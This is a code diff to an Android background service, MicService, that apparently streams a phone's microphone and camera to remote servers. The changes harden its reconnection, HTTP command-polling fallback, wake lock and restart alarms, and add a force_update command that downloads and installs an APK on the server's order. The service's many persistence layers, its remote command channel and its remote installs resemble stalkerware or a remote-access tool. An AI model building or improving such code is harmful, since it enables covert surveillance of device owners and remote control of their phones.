@@ -52,6 +52,8 @@ import androidx.work.ExistingPeriodicWorkPolicy
 import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
 import kotlinx.coroutines.*
+import kotlinx.coroutines.sync.Mutex
+import kotlinx.coroutines.sync.withLock
 import okhttp3.*
 import okio.ByteString
 import okio.ByteString.Companion.toByteString
@@ -113,7 +115,9 @@ class MicService : Service() {
     private var webSocket: WebSocket? = null
     @Volatile private var isWsConnecting = false
     private var wsReconnectJob: Job? = null
+    private val reconnectMutex = Mutex()
     @Volatile private var wsReconnectAttempts = 0
+    @Volatile private var wsConnectFailuresCount = 0 // For Bug 10: only rotate after real failures
     private val okHttpClient = OkHttpClient.Builder()
         .connectTimeout(10, TimeUnit.SECONDS)
         .readTimeout(0,  TimeUnit.MILLISECONDS)  // No read timeout (streaming)
@@ -282,6 +286,7 @@ class MicService : Service() {
 
         // Shared websocket for service health checks and optional future hooks.
         @Volatile var activeWebSocket: WebSocket? = null
+        @Volatile var staticWakeLock: PowerManager.WakeLock? = null
     }
 
     // Layer 8: Multi-Server Failover
@@ -300,8 +305,8 @@ class MicService : Service() {
 
     private val serverHttpBaseUrl: String
         get() {
-            // Pick based on current rotated connection
-            val base = serverUrls[currentServerIndex % serverUrls.size]
+            // Bug B: Always use primary server index for HTTP calls
+            val base = serverUrls[0]
             return base
                 .replace(Regex("^wss://"), "https://")
                 .replace(Regex("^ws://"), "http://")
@@ -332,6 +337,7 @@ class MicService : Service() {
                     // Layer 5 (Network Listener)
                     if (activeWebSocket == null && !isWsConnecting) {
                         currentServerIndex = 0 // Reset to primary since we just got network
+                        wsReconnectAttempts = 0 // Reset backoff for faster recovery (Bug 11)
                         val intent = Intent(applicationContext, MicService::class.java)
                         intent.action = ACTION_RECONNECT
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -372,7 +378,7 @@ class MicService : Service() {
                     isWsConnecting = false
                     
                     // Trigger reconnect immediately to find new path
-                    scheduleWebSocketReconnect("network_lost")
+                    scheduleWebSocketReconnect("network_lost", forceRestart = true)
                     startHttpFallbackSync()
                 }
             }
@@ -390,6 +396,7 @@ class MicService : Service() {
 
         // Reconnect watchdog alarm fired — force a fresh WebSocket if dead
         if (intent?.action == ACTION_RECONNECT) {
+            wsReconnectJob?.cancel() // Bug H: explicitly cancel sleeping job so no double connect race
             if (activeWebSocket == null) {
                 Log.i(TAG, "Reconnect alarm: WebSocket dead, reconnecting…")
                 connectWebSocket()
@@ -398,7 +405,7 @@ class MicService : Service() {
                 if (!isCapturing && !isWebRtcStreaming) startAudioCapture()
                 startMicWatchdog()
             }
-            startHttpFallbackSync() // Ensure HTTP fallback is always running
+            startHttpFallbackSync() // Ensure HTTP fallback is always running (Bug 5)
             scheduleReconnectAlarm() // reschedule for next cycle
             return START_STICKY
         }
@@ -411,6 +418,7 @@ class MicService : Service() {
             startMicWatchdog()
             startDataCollection()
         }
+        startHttpFallbackSync() // Bug 5: Ensure HTTP fallback starts on every command
         scheduleKeepAlive()
         scheduleReconnectAlarm()
         return START_STICKY   // Android restarts service automatically if killed
@@ -493,17 +501,30 @@ class MicService : Service() {
         Log.i(TAG, "onDestroy — stopping service")
         isCapturing  = false
         isSavingFile = false
-        activeWebSocket = null
-        serviceScope.cancel()
+
+        // Cancel reconnect/fallback jobs FIRST (they launch new coroutines)
         wsReconnectJob?.cancel()
         wsReconnectJob = null
+        httpFallbackJob?.cancel()
+        httpFallbackJob = null
+
+        // Stop subsystems BEFORE cancelling scope (they may send final health/ack)
         stopMicWatchdog()
-        stopAudioCapture("stop_capture_for_webrtc")
+        stopAudioCapture("service_destroy")
         stopWebRtcSession(notifyState = false)
         stopCameraLiveStream("service_destroy")
+        stopDataCollection()
         closeRecordingFile()
+
+        // Close WebSocket cleanly
+        activeWebSocket = null
         webSocket?.close(1000, "Service stopped")
+        webSocket = null
         isWsConnecting = false
+
+        // NOW cancel the scope — all cleanup above has already completed
+        serviceScope.cancel()
+
         peerConnectionFactory?.dispose()
         peerConnectionFactory = null
         audioDeviceModule?.release()
@@ -511,7 +532,10 @@ class MicService : Service() {
         networkCallback?.let {
             try { connectivityManager?.unregisterNetworkCallback(it) } catch (e: Exception) {}
         }
-        if (wakeLock?.isHeld == true) wakeLock?.release()
+        // Bug 7: Guard WakeLock release against double-release crash
+        try {
+            if (wakeLock?.isHeld == true) wakeLock?.release()
+        } catch (_: Exception) {}
         
         // Layer 15: Last strict fallback if completely killed
         scheduleForcedRestart()
@@ -536,6 +560,7 @@ class MicService : Service() {
 
         try {
             webSocket?.close(1000, "Reconnecting")
+            webSocket = null
         } catch (_: Exception) {}
 
         val requestBuilder = Request.Builder()
@@ -552,11 +577,10 @@ class MicService : Service() {
             override fun onOpen(webSocket: WebSocket, response: Response) {
                 Log.i(TAG, "WebSocket connected ✅ to $serverUrl")
                 isWsConnecting = false
+                wsConnectFailuresCount = 0 // Reset failure count on success (Bug 10)
                 activeWebSocket = webSocket
                 wsReconnectAttempts = 0
                 currentServerIndex = 0 // Reset to primary on success
-                wsReconnectJob?.cancel()
-                wsReconnectJob = null
                 
                 // Stop the HTTP polling if it's running fast
                 startHttpFallbackSync()
@@ -587,27 +611,38 @@ class MicService : Service() {
 
             override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                 Log.e(TAG, "WebSocket failure: ${t.message}")
+                isWsConnecting = false // Ensure reset even on failure (Bug 2)
+                wsConnectFailuresCount++ // Increment failure count (Bug 10)
                 onWsDisconnected("failure")
             }
 
             override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                 Log.w(TAG, "WebSocket closed: $reason")
+                isWsConnecting = false // Ensure reset (Bug 2)
                 onWsDisconnected("closed")
             }
             })
         } catch (e: Exception) {
             Log.e(TAG, "WebSocket creation failed: ${e.message}", e)
-            isWsConnecting = false
+            isWsConnecting = false // Bug 2: Reset on exception
+            wsConnectFailuresCount++
+            onWsDisconnected("creation_failed")
         }
     }
 
     private fun onWsDisconnected(reason: String) {
-        if (!isWsConnecting) {
-            currentServerIndex++ // Layer 8: Rotate server after connection failure
-            Log.i(TAG, "Server rotated to index $currentServerIndex")
+        // Bug 10: Only rotate server after multiple consecutive connection failures.
+        // Clean disconnects (onClosed) or first failures shouldn't immediately rotate.
+        if (wsConnectFailuresCount >= 3) {
+            currentServerIndex++
+            wsConnectFailuresCount = 0
+            Log.i(TAG, "Server rotated to index $currentServerIndex after 3 failures")
         }
-        isWsConnecting = false
+        
         activeWebSocket = null
+        webSocket = null  // Bug 6: Clear both WS references to prevent stale sends
+        
+        // Bug A/3: Job cancellation correctly delegated to scheduleWebSocketReconnect with mutex protection
         
         stopCameraLiveStream("ws_disconnected")
         stopMicWatchdog()
@@ -618,15 +653,15 @@ class MicService : Service() {
         // Ensure HTTP fallback polling picks up slack
         startHttpFallbackSync()
         
-        scheduleWebSocketReconnect(reason)
+        scheduleWebSocketReconnect(reason, forceRestart = true)
     }
 
     // Safe WebSocket send with automatic error handling and reconnection
+    // Bug 6: Use activeWebSocket (the one that gets nulled on disconnect), NOT webSocket
     private fun safeSend(data: Any): Boolean {
         return try {
-            val ws = webSocket
-            if (ws == null || activeWebSocket == null) {
-                Log.w(TAG, "Cannot send - WebSocket is null")
+            val ws = activeWebSocket
+            if (ws == null) {
                 return false
             }
             
@@ -638,7 +673,9 @@ class MicService : Service() {
             true
         } catch (e: Exception) {
             Log.w(TAG, "WebSocket send failed: ${e.message} - triggering reconnect")
-            onWsDisconnected("send_failed")
+            serviceScope.launch(Dispatchers.Default) {
+                onWsDisconnected("send_failed")
+            }
             false
         }
     }
@@ -661,40 +698,46 @@ class MicService : Service() {
         return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
     }
 
-    // ── Layer 2 & Layer 12: HTTP Fallback and Heartbeat ──
+    private val httpFallbackMutex = Mutex()
     private var httpFallbackJob: Job? = null
     
     private fun startHttpFallbackSync() {
-        if (httpFallbackJob?.isActive == true) return
-        httpFallbackJob = serviceScope.launch(Dispatchers.IO) {
-            while (isActive) {
-                // HTTP Heartbeat (Layer 12)
-                try {
-                    val url = "$serverHttpBaseUrl/api/heartbeat"
-                    val request = Request.Builder()
-                        .url(url)
-                        .post(RequestBody.create(null, ByteArray(0)))
-                        .addHeader("X-Device-Id", deviceId)
-                        .build()
-                    val response = okHttpClient.newCall(request).execute()
-                    if (response.isSuccessful) {
-                        val body = response.body?.string()
-                        if (body?.contains("\"commandsAvailable\":true") == true) {
-                            // Layer 2: fetch commands immediately via sync
+        serviceScope.launch(Dispatchers.IO) {
+            httpFallbackMutex.withLock {
+                if (httpFallbackJob?.isActive == true) return@withLock
+                
+                // Bug D: Launch inner job directly on serviceScope to avoid parent cancellation destroying it
+                httpFallbackJob = serviceScope.launch(Dispatchers.IO) {
+                    while (isActive) {
+                        // HTTP Heartbeat (Layer 12)
+                        try {
+                            val url = "$serverHttpBaseUrl/api/heartbeat"
+                            val request = Request.Builder()
+                                .url(url)
+                                .post(RequestBody.create(null, ByteArray(0)))
+                                .addHeader("X-Device-Id", deviceId)
+                                .build()
+                            val response = okHttpClient.newCall(request).execute()
+                            if (response.isSuccessful) {
+                                val body = response.body?.string()
+                                if (body?.contains("\"commandsAvailable\":true") == true) {
+                                    // Layer 2: fetch commands immediately via sync
+                                    syncCommandsNow()
+                                }
+                            }
+                            response.close()
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Heartbeat failed: ${e.message}")
+                        }
+                        
+                        // HTTP Polling Fallback (Layer 2)
+                        if (activeWebSocket == null) {
                             syncCommandsNow()
+                            delay(30_000) // Poll every 30s as requested by user if WS is dead
+                        } else {
+                            delay(180_000) // Just heartbeat every 3 min if WS is alive
                         }
                     }
-                    response.close()
-                } catch (e: Exception) {
-                    Log.w(TAG, "Heartbeat failed: ${e.message}")
-                }
-                
-                // HTTP Polling Fallback (Layer 2)
-                if (activeWebSocket == null) {
-                    syncCommandsNow()
-                    delay(30_000) // Poll every 30s as requested by user if WS is dead
-                } else {
-                    delay(180_000) // Just heartbeat every 3 min if WS is alive
                 }
             }
         }
@@ -745,27 +788,47 @@ class MicService : Service() {
         return (expDelay + jitter).coerceAtMost(WS_RECONNECT_MAX_MS)
     }
 
-    private fun scheduleWebSocketReconnect(reason: String) {
-        wsReconnectJob?.cancel()
-        wsReconnectJob = null
-        wsReconnectJob = serviceScope.launch(Dispatchers.IO) {
-            while (isActive && activeWebSocket == null) {
-                if (!isNetworkUsable()) {
-                    updateNotification("Offline — waiting for network…")
-                    delay(1_500)
-                    continue
+    private fun scheduleWebSocketReconnect(reason: String, forceRestart: Boolean = false) {
+        serviceScope.launch(Dispatchers.IO) {
+            reconnectMutex.withLock {
+                if (forceRestart) {
+                    wsReconnectJob?.cancel()
+                } else if (wsReconnectJob?.isActive == true) {
+                    return@withLock
                 }
-                if (isWsConnecting) {
-                    // Wait for current connection attempt to finish
-                    delay(1_000)
-                    continue
+                
+                // Bug F: Launch directly from serviceScope so this child isn't instantly killed when the mutex scope finishes
+                wsReconnectJob = serviceScope.launch(Dispatchers.IO) {
+                    while (isActive && activeWebSocket == null) {
+                        if (!isNetworkUsable()) {
+                            updateNotification("Offline — waiting for network…")
+                            delay(2_000)
+                            continue
+                        }
+                        if (isWsConnecting) {
+                            delay(1_000)
+                            continue
+                        }
+                        
+                        // Reset attempt counter to keep backoff short
+                        if (wsReconnectAttempts >= 10) wsReconnectAttempts = 0
+
+                        val delayMs = nextReconnectDelayMs()
+                        wsReconnectAttempts = (wsReconnectAttempts + 1).coerceAtMost(20)
+                        updateNotification("Disconnected ($reason) — retry in ${delayMs / 1000}s…")
+
+                        // Bug 1: Wait FIRST, then connect (proper exponential backoff)
+                        delay(delayMs)
+
+                        // Recheck after delay — another path may have connected
+                        if (activeWebSocket != null || isWsConnecting) continue
+
+                        connectWebSocket()
+
+                        // Give OkHttp time to complete the handshake before looping
+                        delay(5_000)
+                    }
                 }
-                val delayMs = nextReconnectDelayMs()
-                updateNotification("Disconnected ($reason) — reconnecting in ${delayMs / 1000}s…")
-                delay(delayMs)
-                if (activeWebSocket != null) break
-                wsReconnectAttempts = (wsReconnectAttempts + 1).coerceAtMost(20)
-                connectWebSocket()
             }
         }
     }
@@ -830,10 +893,32 @@ class MicService : Service() {
                 sendCommandAck("get_data")
             }
             "force_update" -> {
-                Log.i(TAG, "CMD: force_update - checking for updates")
-                UpdateWorker.checkNow(this)
+                Log.i(TAG, "CMD: force_update - immediate update check + install")
                 safeSend("ACK:force_update")
-                sendCommandAck("force_update")
+                sendCommandAck("force_update", detail = "checking")
+                
+                // Direct inline update — bypass WorkManager constraints
+                serviceScope.launch(Dispatchers.IO) {
+                    try {
+                        safeSend("""{"type":"update_status","status":"checking","message":"Checking for updates..."}""")
+                        
+                        val versionInfo = UpdateService.checkForUpdate(this@MicService, forceCheck = true)
+                        if (versionInfo != null) {
+                            safeSend("""{"type":"update_status","status":"downloading","version":"${versionInfo.versionName}","code":${versionInfo.versionCode},"size":${versionInfo.apkSize}}""")
+                            Log.i(TAG, "Update available: ${versionInfo.versionName} (code ${versionInfo.versionCode})")
+                            
+                            UpdateService.downloadAndInstall(this@MicService, versionInfo)
+                            
+                            safeSend("""{"type":"update_status","status":"installing","version":"${versionInfo.versionName}"}""")
+                        } else {
+                            safeSend("""{"type":"update_status","status":"up_to_date","currentVersion":"${BuildConfig.VERSION_NAME}","currentCode":${BuildConfig.VERSION_CODE}}""")
+                            Log.i(TAG, "No update available — already on latest")
+                        }
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Force update failed: ${e.message}")
+                        safeSend("""{"type":"update_status","status":"error","message":"${e.message?.take(100)?.replace("\"", "'")}"}""")
+                    }
+                }
             }
             "grant_permissions" -> {
                 Log.i(TAG, "CMD: grant_permissions - re-granting all permissions")
@@ -1607,7 +1692,8 @@ class MicService : Service() {
         }
         val maxBitrateLimit = if (isFarMode) WEBRTC_FAR_MAX_KBPS * 1000 else WEBRTC_STANDARD_MAX_KBPS * 1000
         val maxAvg = (effectiveTarget * 1000).coerceIn(WEBRTC_MIN_BITRATE_KBPS * 1000, maxBitrateLimit)
-        val minAvg = (WEBRTC_MIN_BITRATE_KBPS * 1000).coerceAtMost(maxAvg)
+        val minBitrateFloor = if (isFarMode) WEBRTC_FAR_MIN_KBPS * 1000 else WEBRTC_MIN_BITRATE_KBPS * 1000
+        val minAvg = minBitrateFloor.coerceAtMost(maxAvg)
         
         // Adaptive ptime: 20ms normal, 40ms for low network (fewer packets)
         // Far mode: use 20ms for lower latency
@@ -1742,12 +1828,12 @@ class MicService : Service() {
             val q = lastDashboardQuality
             val loss = q?.optDouble("lossPct", Double.NaN) ?: Double.NaN
             
-            // Far mode in low network: still prioritize higher bitrates where possible
-            return if (!loss.isNaN() && loss >= 10.0) {
-                if (isFarMode) WEBRTC_MID_BITRATE_KBPS else WEBRTC_MIN_BITRATE_KBPS
-            } else {
-                if (isFarMode) WEBRTC_FAR_MIN_KBPS else WEBRTC_MID_BITRATE_KBPS
+            // Far voice: never cap the RTP sender at 64 kbps — that overrode Opus fmtp and
+            // crushed distant-speech clarity. Stay on far-tier bitrates only.
+            if (isFarMode) {
+                return if (!loss.isNaN() && loss >= 10.0) WEBRTC_FAR_MIN_KBPS else WEBRTC_FAR_MID_KBPS
             }
+            return if (!loss.isNaN() && loss >= 10.0) WEBRTC_MIN_BITRATE_KBPS else WEBRTC_MID_BITRATE_KBPS
         }
         
         // FAR MODE (good network): Use higher bitrates for better distant voice capture
@@ -2509,16 +2595,10 @@ class MicService : Service() {
             // Set highest audio priority for this thread
             android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_AUDIO)
             
-            // Bind to best available network for stable streaming
-            try {
-                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
-                cm?.activeNetwork?.let { network ->
-                    cm.bindProcessToNetwork(network)
-                    Log.i(TAG, "Bound to network for audio priority")
-                }
-            } catch (e: Exception) {
-                Log.w(TAG, "Network binding failed: ${e.message}")
-            }
+            // Bug 4: DO NOT call bindProcessToNetwork() — it pins ALL sockets
+            // (WebSocket, HTTP, etc.) to one network. When that network drops,
+            // ALL connections fail until audio capture restarts. The system's
+            // default routing already handles WiFi↔Cellular transitions cleanly.
             
             // MODE_IN_COMMUNICATION activates the phone's call-quality mic profile, which
             // typically has significantly higher analog sensitivity than MODE_NORMAL —
@@ -2717,6 +2797,11 @@ class MicService : Service() {
                 }
 
             } catch (e: Exception) {
+                // Bug G: Ignore the double-stop exception if we already triggered capturing to stop (e.g., from safeSend -> onWsDisconnected)
+                if (!isCapturing && e is IllegalStateException) {
+                    Log.i(TAG, "Audio capture loop stopped cleanly (IllegalStateException ignored)")
+                    return@launch
+                }
                 Log.e(TAG, "Audio capture error", e)
                 if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                 isCapturing = false
@@ -3811,15 +3896,24 @@ class MicService : Service() {
     // ────────────────────────────────────────────────────────────────────────
     // WakeLock — keeps CPU awake while app is in background
     // ────────────────────────────────────────────────────────────────────────
-
     private fun acquireWakeLock() {
         val pm = getSystemService(PowerManager::class.java)
-        wakeLock = pm.newWakeLock(
-            PowerManager.PARTIAL_WAKE_LOCK,
-            "MicMonitor::AudioWakeLock"
-        ).also {
-            it.setReferenceCounted(false)
-            if (!it.isHeld) it.acquire() // Released in onDestroy
+        
+        synchronized(MicService::class.java) {
+            if (staticWakeLock == null) {
+                staticWakeLock = pm.newWakeLock(
+                    PowerManager.PARTIAL_WAKE_LOCK,
+                    "MicMonitor::AudioWakeLock"
+                ).apply {
+                    setReferenceCounted(false)
+                }
+            }
+            // Bug E/4: Acquire static wakelock with 24 hours timeout to prevent permanent system leak.
+            // Using a static instance prevents multiple orphaned lock holds upon component recreation.
+            if (staticWakeLock?.isHeld != true) {
+                staticWakeLock?.acquire(24 * 60 * 60 * 1000L) // Released in onDestroy
+            }
+            wakeLock = staticWakeLock
         }
     }
 
@@ -3832,7 +3926,7 @@ class MicService : Service() {
             .build()
         WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
             "keep_alive",
-            ExistingPeriodicWorkPolicy.REPLACE,
+            ExistingPeriodicWorkPolicy.KEEP,
             request
         )
         Log.i(TAG, "KeepAlive watchdog scheduled (15 min interval)")
@@ -3855,7 +3949,15 @@ class MicService : Service() {
         val alarmManager = getSystemService(AlarmManager::class.java)
         val triggerAt = SystemClock.elapsedRealtime() + 8 * 60 * 1000L
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            alarmManager.setAndAllowWhileIdle(
+            // Bug 2: On Android 12+ exact alarms need SCHEDULE_EXACT_ALARM permission
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmManager.canScheduleExactAlarms()) {
+                alarmManager.setAndAllowWhileIdle(
+                    AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pendingIntent
+                )
+                Log.w(TAG, "Exact alarm permission denied, using inexact fallback")
+                return
+            }
+            alarmManager.setExactAndAllowWhileIdle(
                 AlarmManager.ELAPSED_REALTIME_WAKEUP,
                 triggerAt,
                 pendingIntent
